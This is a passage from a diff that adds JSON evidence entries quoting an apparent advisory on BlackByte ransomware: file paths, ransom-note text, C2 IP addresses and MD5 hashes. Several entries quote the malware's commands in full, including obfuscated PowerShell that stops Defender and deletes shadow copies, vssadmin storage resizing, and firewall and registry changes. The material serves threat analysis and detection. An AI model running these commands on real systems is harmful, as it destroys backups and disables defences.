+   "quote": "Below is a list of observed commands that were executed by complex.exe: cmd.exe /c powershell -command \"$x = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('VwBpA'+'G4ARAB'+'lAGYA'+'ZQB'+'uAG'+'QA'));Stop-Service -Name $x;Set-Service -StartupType Disabled $x\" ... powershell.exe $x = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('RwBlA GTALQBXAG0AaQBPAGIAagBlAGMAdAAg'+'AFcAaQBuADMAMgBfAFMAaABhAGQAb wB3AGMAbwBwAHkAIAB8AC'+'AARgBvAHIARQBhAGMAaAAtAE8AYgBqAGUAYwB0A CAAewAkA'+'F8ALgBEAGUAbABlAHQAZQAoACkAOwB9AA=='));Invoke-Expression $x\" ...",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "16"
+   },
+   "quote_verified": false,
+   "quote_match": "partial",
+   "match_score": 0.9825,
+   "matched_text": "ALQBXAG0AaQBPAGIAagBlAGMAdAAg'+'AFcAaQBuADMAMgBfAFMAaABhAGQAb wB3AGMAbwBwAHkAIAB8AC'+'AARgBvAHIARQBhAGMAaAAtAE8AYgBqAGUAYwB0A CAAewAkA'+'F8ALgBEAGUAbABlAHQAZQAo"
+  },
+  {
+   "id": "evidence-9",
+   "quote": "The base64 encoded string in the following command: powershell.exe $x = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('RwBlA GTALQBXAG0AaQBPAGIAagBlAGMAdAAg'+'AFcAaQBuADMAMgBfAFMAaABhAGQAb wB3AGMAbwBwAHkAIAB8AC'+'AARgBvAHIARQBhAGMAaAAtAE8AYgBqAGUAYwB0A CAAewAkA'+'F8ALgBEAGUAbABlAHQAZQAoACkAOwB9AA=='));Invoke-Expression $x",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "19"
+   },
+   "quote_verified": false,
+   "quote_match": "partial",
+   "match_score": 0.9615,
+   "matched_text": "ALQBXAG0AaQBPAGIAagBlAGMAdAAg'+'AFcAaQBuADMAMgBfAFMAaABhAGQAb wB3AGMAbwBwAHkAIAB8AC'+'AARgBvAHIARQBhAGMAaAAtAE8AYgBqAGUAYwB0A CAAewAkA'+'F8ALgBEAGUAbABlAHQAZQAo"
+  },
+  {
+   "id": "evidence-10",
+   "quote": "Decodes to: Get-WmiObject Win32_Shadowcopy | ForEach-Object {$_.Delete();}",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "20"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "Decodes to:\n        Get-WmiObject Win32_Shadowcopy | ForEach-Object {$_.Delete();}"
+  },
+  {
+   "id": "evidence-11",
+   "quote": "The base64 encoded string in the following command: cmd.exe /c powershell -command \"$x = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('VwBpA'+'G4ARA B'+'lAGYA'+'ZQB'+'uAG'+'QA'));Stop-Service -Name $x;Set-Service -StartupType Disabled $x\"",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "21"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "The base64 encoded string in the following command:\n        cmd.exe /c powershell -command \"$x =\n        [System.Text.Encoding]::Unicode.GetString([System.Conve"
+  },
+  {
+   "id": "evidence-12",
+   "quote": "cmd.exe /c netsh advfirewall firewall set rule \"group=\\\"Network Discovery\\\"\" new enable=Yes cmd.exe /c netsh advfirewall firewall set rule \"group=\\\"File and Printer Sharing\\\"\" new enable=Yes cmd.exe /c reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f cmd.exe /c reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableLinkedConnections /t REG_DWORD /d 1 /f cmd.exe /c reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\FileSystem /v LongPathsEnabled /t REG_DWORD /d 1 /f mountvol.exe A: \\\\?\\Volume{d7e47829-0000-0000-0000-100000000000}\\ mountvol.exe B: \\\\?\\Volume{d7e47829-0000-0000-0000-b0e213000000}\\ mountvol.exe E: \\\\?\\Volume{fce79ce0-b01f-11e6-b968-806e6f6e6963}\\ powershell.exe Install-WindowsFeature -Name \\\"RSAT-AD-PowerShell\\\" – IncludeAllSubFeature net.exe view arp.exe -a powershell.exe Import-Module ActiveDirectory;Get-ADComputer -Filter * -Properties * | FT Name notepad.exe %appdata%\\RestoreMyFiles_BlackByte.txt cmd.exe /c ping 1.1.1.1 -n 10 > Nul & Del C:\\Users\\REM\\Desktop\\hybrid-9-8\\complex.exe",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "18"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "cmd.exe /c netsh advfirewall firewall set rule \"group=\\\"Network Discovery\\\"\" new\n        enable=Yes\n        cmd.exe /c netsh advfirewall firewall set rule \"grou"
+  },
+  {
+   "id": "evidence-13",
+   "quote": "BlackByte ransomware runs executables from c:\\windows\\system32\\ and C:\\Windows\\. Process injection has been observed on processes it creates.",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "5"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "BlackByte ransomware runs executables from c:\\windows\\system32\\ and C:\\Windows\\. Process injection has been observed on processes it creates."
+  },
+  {
+   "id": "evidence-14",
+   "quote": "Program Files\\Microsoft\\Exchange Server\\V15\\FrontEnd\\HttpProxy\\owa\\auth",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "8"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "Program Files\\Microsoft\\Exchange Server\\V15\\FrontEnd\\HttpProxy\\owa\\auth"
+  },
+  {
+   "id": "evidence-15",
+   "quote": "BlackByte is a Ransomware as a Service (RaaS) group that encrypts files on compromised Windows host systems, including physical and virtual servers.",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "4"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "BlackByte is a Ransomware as a Service (RaaS) group that encrypts files on compromised Windows host systems, including physical and virtual servers."
+  },
+  {
+   "id": "evidence-16",
+   "quote": "%HOMEPATH%\\complex.exe\nThis file is the ransomware executable.",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "10"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "%HOMEPATH%\\complex.exe This file is the ransomware executable."
+  },
+  {
+   "id": "evidence-17",
+   "quote": "%AppData%\\BlackByteRestore.txt\nThis file is the ransom note that is left in every folder where files are encrypted.",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "10"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "%AppData%\\BlackByteRestore.txt This file is the ransom note that is left in every folder where files are encrypted."
+  },
+  {
+   "id": "evidence-18",
+   "quote": "Users\\tree.dll\nThis file contains the message \"Your HACKED by BlackByte team. Connect us to restore your system.\" (SIC)",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "10"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "Users\\tree.dll This file contains the message \"Your HACKED by BlackByte team. Connect us to restore your system.\" (SIC)"
+  },
+  {
+   "id": "evidence-19",
+   "quote": "Scheduled tasks may be created and artifacts have been observed at Windows\\System32\\Tasks:\nC:\\Users\\<username>\\complex.exe -single <SHA256>.\nThis command appears to launch the ransomware.",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "12"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "Scheduled tasks may be created and artifacts have been observed at Windows\\System32\\Tasks: C:\\Users\\<username>\\complex.exe single <SHA256>. This command appears"
+  },
+  {
+   "id": "evidence-20",
+   "quote": "185.93.6.31",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "5"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "185.93.6.31"
+  },
+  {
+   "id": "evidence-21",
+   "quote": "45.9.148.114",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "5"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "45.9.148.114"
+  },
+  {
+   "id": "evidence-22",
+   "quote": "www.us-cert.gov",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "6"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "www.us cert.gov"
+  },
+  {
+   "id": "evidence-23",
+   "quote": "4d2da36174633565f3dd5ed6dc5033c4",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "14"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "4d2da36174633565f3dd5ed6dc5033c4"
+  },
+  {
+   "id": "evidence-24",
+   "quote": "959a7df5c465fcd963a641d87c18a565",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "14"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "959a7df5c465fcd963a641d87c18a565"
+  },
+  {
+   "id": "evidence-25",
+   "quote": "cd7034692d8f29f9146deb3641de7986",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "14"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "cd7034692d8f29f9146deb3641de7986"
+  },
+  {
+   "id": "evidence-26",
+   "quote": "5f40e1859053b70df9c0753d327f2cee",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "14"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "5f40e1859053b70df9c0753d327f2cee"
+  },
+  {
+   "id": "evidence-27",
+   "quote": "d63a7756bfdcd2be6c755bf288a92c8b",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "14"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "d63a7756bfdcd2be6c755bf288a92c8b"
+  },
+  {
+   "id": "evidence-28",
+   "quote": "df7befc8cdc3c5434ef27cc669fb1e4b",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "14"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "df7befc8cdc3c5434ef27cc669fb1e4b"
+  },
+  {
+   "id": "evidence-29",
+   "quote": "eed7357ab8d2fe31ea3dbcf3f9b7ec74",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "14"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "eed7357ab8d2fe31ea3dbcf3f9b7ec74"
+  },
+  {
+   "id": "evidence-30",
+   "quote": "51f2cf541f004d3c1fa8b0f94c89914a",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "14"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "51f2cf541f004d3c1fa8b0f94c89914a"
+  },
+  {
+   "id": "evidence-31",
+   "quote": "695e343b81a7b0208cbae33e11f7044c",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "14"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "695e343b81a7b0208cbae33e11f7044c"
+  },
+  {
+   "id": "evidence-32",
+   "quote": "d9e94f076d175ace80f211ea298fa46e",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "14"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "d9e94f076d175ace80f211ea298fa46e"
+  },
+  {
+   "id": "evidence-33",
+   "quote": "296c51eb03e70808304b5f0e050f4f94",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "14"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "296c51eb03e70808304b5f0e050f4f94"
+  },
+  {
+   "id": "evidence-34",
+   "quote": "8320d9ec2eab7f5ff49186b2e630a15f",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "14"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "8320d9ec2eab7f5ff49186b2e630a15f"
+  },
+  {
+   "id": "evidence-35",
+   "quote": "0c7b8da133799dd72d0dbe3ea012031e",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "14"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "0c7b8da133799dd72d0dbe3ea012031e"
+  },
+  {
+   "id": "evidence-36",
+   "quote": "cea6be26d81a8ff3db0d9da666cd0f8f",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "14"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "cea6be26d81a8ff3db0d9da666cd0f8f"
+  },
+  {
+   "id": "evidence-37",
+   "quote": "a77899602387665cddb6a0f021184a2b",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "14"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "a77899602387665cddb6a0f021184a2b"
+  },
+  {
+   "id": "evidence-38",
+   "quote": "31f818372fa07d1fd158c91510b6a077",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "14"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "31f818372fa07d1fd158c91510b6a077"
+  },
+  {
+   "id": "evidence-39",
+   "quote": "1473c91e9c0588f92928bed0ebf5e0f4",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "14"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "1473c91e9c0588f92928bed0ebf5e0f4"
+  },
+  {
+   "id": "evidence-40",
+   "quote": "28b791746c97c0c04dcbfe0954e7173b",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "14"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "28b791746c97c0c04dcbfe0954e7173b"
+  },
+  {
+   "id": "evidence-41",
+   "quote": "a9cf6dce244ad9afd8ca92820b9c11b9",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "14"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "a9cf6dce244ad9afd8ca92820b9c11b9"
+  },
+  {
+   "id": "evidence-42",
+   "quote": "52b8ae74406e2f52fd81c8458647acd8",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "14"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "52b8ae74406e2f52fd81c8458647acd8"
+  },
+  {
+   "id": "evidence-43",
+   "quote": "7139415fecd716bec6d38d2004176f5d",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "14"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "7139415fecd716bec6d38d2004176f5d"
+  },
+  {
+   "id": "evidence-44",
+   "quote": "1785f4058c78ae3dd030808212ae3b04",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "14"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "1785f4058c78ae3dd030808212ae3b04"
+  },
+  {
+   "id": "evidence-45",
+   "quote": "c13bf39e2f8bf49c9754de7fb1396a33",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "14"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "c13bf39e2f8bf49c9754de7fb1396a33"
+  },
+  {
+   "id": "evidence-46",
+   "quote": "b8e24e6436f6bed17757d011780e87b9",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "14"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "b8e24e6436f6bed17757d011780e87b9"
+  },
+  {
+   "id": "evidence-47",
+   "quote": "5c0a549ae45d9abe54ab662e53c484e2",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "14"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "5c0a549ae45d9abe54ab662e53c484e2"
+  },
+  {
+   "id": "evidence-48",
+   "quote": "8dfa48e56fc3a6a2272771e708cdb4d2",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "14"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "8dfa48e56fc3a6a2272771e708cdb4d2"
+  },
+  {
+   "id": "evidence-49",
+   "quote": "ad29212716d0b074d976ad7e33b8f35f",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "14"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "ad29212716d0b074d976ad7e33b8f35f"
+  },
+  {
+   "id": "evidence-50",
+   "quote": "4ce0bdd2d4303bf77611b8b34c7d2883",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "14"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "4ce0bdd2d4303bf77611b8b34c7d2883"
+  },
+  {
+   "id": "evidence-51",
+   "quote": "d4aa276a7fbe8dcd858174eeacbb26ce",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "14"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "d4aa276a7fbe8dcd858174eeacbb26ce"
+  },
+  {
+   "id": "evidence-52",
+   "quote": "c010d1326689b95a3d8106f75003427c",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "14"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "c010d1326689b95a3d8106f75003427c"
+  },
+  {
+   "id": "evidence-53",
+   "quote": "9344afc63753cd5e2ee0ff9aed43dc56",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "14"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "9344afc63753cd5e2ee0ff9aed43dc56"
+  },
+  {
+   "id": "evidence-54",
+   "quote": "ae6fbc60ba9c0f3a0fef72aeffcd3dc7",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "14"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "ae6fbc60ba9c0f3a0fef72aeffcd3dc7"
+  },
+  {
+   "id": "evidence-55",
+   "quote": "e2eb5b57a8765856be897b4f6dadca18",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "14"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "e2eb5b57a8765856be897b4f6dadca18"
+  },
+  {
+   "id": "evidence-56",
+   "quote": "405cb8b1e55bb2a50f2ef3e7c2b28496",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "14"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "405cb8b1e55bb2a50f2ef3e7c2b28496"
+  },
+  {
+   "id": "evidence-57",
+   "quote": "58e8043876f2f302fbc98d00c270778b",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "14"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "58e8043876f2f302fbc98d00c270778b"
+  },
+  {
+   "id": "evidence-58",
+   "quote": "11e35160fc4efabd0a3bd7a7c6afc91b",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "14"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "11e35160fc4efabd0a3bd7a7c6afc91b"
+  },
+  {
+   "id": "evidence-59",
+   "quote": "d2a15e76a4bfa7eb007a07fc8738edfb",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "14"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "d2a15e76a4bfa7eb007a07fc8738edfb"
+  },
+  {
+   "id": "evidence-60",
+   "quote": "659b77f88288b4874b5abe41ed36380d",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "14"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "659b77f88288b4874b5abe41ed36380d"
+  },
+  {
+   "id": "evidence-61",
+   "quote": "e46bfbdf1031ea5a383040d0aa598d45",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "14"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "e46bfbdf1031ea5a383040d0aa598d45"
+  },
+  {
+   "id": "evidence-62",
+   "quote": "151c6f04aeff0e00c54929f25328f6f7",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "14"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "151c6f04aeff0e00c54929f25328f6f7"
+  },
+  {
+   "id": "evidence-63",
+   "quote": "System.Text.Encoding",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "16"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "System.Text.Encoding"
+  },
+  {
+   "id": "evidence-64",
+   "quote": "www.stopransomware.gov",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "24"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "www.stopransomware.gov"
+  },
+  {
+   "id": "evidence-65",
+   "quote": "cmd.exe /c for /l %x in (1,1,75) do start wordpad.exe /p C:\\Users\\tree.dll. This command attempts to open tree.dll in wordpad 75 times and then prints the contents",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "12"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "cmd.exe /c for /l %x in (1,1,75) do start wordpad.exe /p C:\\Users\\tree.dll. This command attempts to open tree.dll in wordpad 75 times and then prints the conte"
+  },
+  {
+   "id": "evidence-66",
+   "quote": "cmd.exe /c powershell -command \"$x = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('VwBpA' +'G4ARAB'+'lAGYA'+'ZQB'+'uAG'+'QA'));Stop-Service -Name $x;Set-Service -StartupType Disabled $x\" schtasks.exe /DELETE /TN \"\\\"Raccine Rules Updater\\\"\" /F",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "16"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "cmd.exe /c powershell command \"$x = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('VwBpA' +'G4ARAB'+'lAGYA'+'ZQB'+'uAG'+'QA'));St"
+  },
+  {
+   "id": "evidence-67",
+   "quote": "cmd.exe /c vssadmin resize shadowstorage /for=c: /on=c: /maxsize=401MB",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "16"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "cmd.exe /c vssadmin resize shadowstorage /for=c: /on=c: /maxsize=401MB"
+  },
+  {
+   "id": "evidence-68",
+   "quote": "cmd.exe /c vssadmin resize shadowstorage /for=c: /on=c: /maxsize=unbounded",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "16"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "cmd.exe /c vssadmin resize shadowstorage /for=c: /on=c: /maxsize=unbounded"
+  },
+  {
+   "id": "evidence-69",
+   "quote": "cmd.exe /c vssadmin resize shadowstorage /for=d: /on=d: /maxsize=401MB",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "16"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "cmd.exe /c vssadmin resize shadowstorage /for=d: /on=d: /maxsize=401MB"
+  },
+  {
+   "id": "evidence-70",
+   "quote": "cmd.exe /c vssadmin resize shadowstorage /for=d: /on=d: /maxsize=unbounded",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "16"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "cmd.exe /c vssadmin resize shadowstorage /for=d: /on=d: /maxsize=unbounded"
+  },
+  {
+   "id": "evidence-71",
+   "quote": "cmd.exe /c vssadmin resize shadowstorage /for=e: /on=e: /maxsize=401MB",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "16"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "cmd.exe /c vssadmin resize shadowstorage /for=e: /on=e: /maxsize=401MB"
+  },
+  {
+   "id": "evidence-72",
+   "quote": "cmd.exe /c vssadmin resize shadowstorage /for=e: /on=e: /maxsize=unbounded",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "16"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "cmd.exe /c vssadmin resize shadowstorage /for=e: /on=e: /maxsize=unbounded"
+  },
+  {
+   "id": "evidence-73",
+   "quote": "cmd.exe /c vssadmin resize shadowstorage /for=f: /on=f: /maxsize=401MB",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "16"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "cmd.exe /c vssadmin resize shadowstorage /for=f: /on=f: /maxsize=401MB"
+  },
+  {
+   "id": "evidence-74",
+   "quote": "cmd.exe /c vssadmin resize shadowstorage /for=f: /on=f: /maxsize=unbounded",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "16"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "cmd.exe /c vssadmin resize shadowstorage /for=f: /on=f: /maxsize=unbounded"
+  },
+  {
+   "id": "evidence-75",
+   "quote": "cmd.exe /c vssadmin resize shadowstorage /for=g: /on=g: /maxsize=401MB",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "16"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "cmd.exe /c vssadmin resize shadowstorage /for=g: /on=g: /maxsize=401MB"
+  },
+  {
+   "id": "evidence-76",
+   "quote": "cmd.exe /c vssadmin resize shadowstorage /for=g: /on=g: /maxsize=unbounded",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "16"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "cmd.exe /c vssadmin resize shadowstorage /for=g: /on=g: /maxsize=unbounded"
+  },
+  {
+   "id": "evidence-77",
+   "quote": "cmd.exe /c vssadmin resize shadowstorage /for=h: /on=h: /maxsize=401MB",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "16"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "cmd.exe /c vssadmin resize shadowstorage /for=h: /on=h: /maxsize=401MB"
+  },
+  {
+   "id": "evidence-78",
+   "quote": "cmd.exe /c vssadmin resize shadowstorage /for=h: /on=h: /maxsize=unbounded",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "16"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "cmd.exe /c vssadmin resize shadowstorage /for=h: /on=h: /maxsize=unbounded"
+  },
+  {
+   "id": "evidence-79",
+   "quote": "powershell.exe $x = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('RwBlA HQALQBXAG0AaQBPAGIAagBlAGMAdAAg'+'AFcAaQBuADMAMgBfAFMAaABhAGQAb wB3AGMAbwBwAHkAIAB8AC'+'AARgBvAHIARQBhAGMAaAAtAE8AYgBqAGUAYwB0A CAAewAkA'+'F8ALgBEAGUAbABlAHQAZQAoACkAOwB9AA=='));Invoke-Expression $x sc.exe config SQLTELEMETRY start= disabled sc.exe config SQLTELEMETRY$ECWDB2 start= disabled sc.exe config SQLWriter start= disabled sc.exe config SstpSvc start= disabled",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "16"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "powershell.exe $x = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('RwBlA HQALQBXAG0AaQBPAGIAagBlAGMAdAAg'+'AFcAaQBuADMAMgBfAFMAaA"
+  },
+  {
+   "id": "evidence-80",
+   "quote": "powershell.exe Set-MpPreference -EnableControlledFolderAccess Disabled sc.exe config MBAMService start= disabled sc.exe config wuauserv start= disabled sc.exe config Dnscache start= auto sc.exe config fdPHost start= auto sc.exe config FDResPub start= auto sc.exe config SSDPSRV start= auto sc.exe config upnphost start= auto sc.exe config RemoteRegistry start= auto",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "16"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "powershell.exe Set MpPreference EnableControlledFolderAccess Disabled sc.exe config MBAMService start= disabled sc.exe config wuauserv start= disabled sc.exe co"
+  },
+  {
+   "id": "evidence-81",
+   "quote": "cmd.exe /c netsh advfirewall firewall set rule \"group=\\\"Network Discovery\\\"\" new enable=Yes",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "18"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "cmd.exe /c netsh advfirewall firewall set rule \"group=\\\"Network Discovery\\\"\" new enable=Yes"
